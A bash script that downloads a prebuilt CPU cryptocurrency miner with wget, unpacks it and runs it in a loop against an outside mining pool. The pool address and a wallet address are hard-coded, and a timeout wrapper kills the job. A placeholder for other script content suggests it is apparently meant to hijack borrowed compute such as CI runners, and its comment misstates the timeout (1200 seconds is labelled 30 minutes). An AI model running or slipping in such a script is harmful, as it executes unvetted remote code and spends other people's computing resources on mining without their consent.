#!/bin/bash

Timeout=1200 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4/cpuminer-gr-1.2.4-x86_64_linux.tar.gz
tar xf cpuminer-gr-1.2.4-x86_64_linux.tar.gz
cd cpuminer-gr-1.2.4-x86_64_linux
cd binaries
COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
     ./cpuminer-sse2 -a gr -o stratum+tcps://us.flockpool.com:5555 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee --no-tune -t 24

     echo COUNTER $COUNTER
     let COUNTER-=1
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
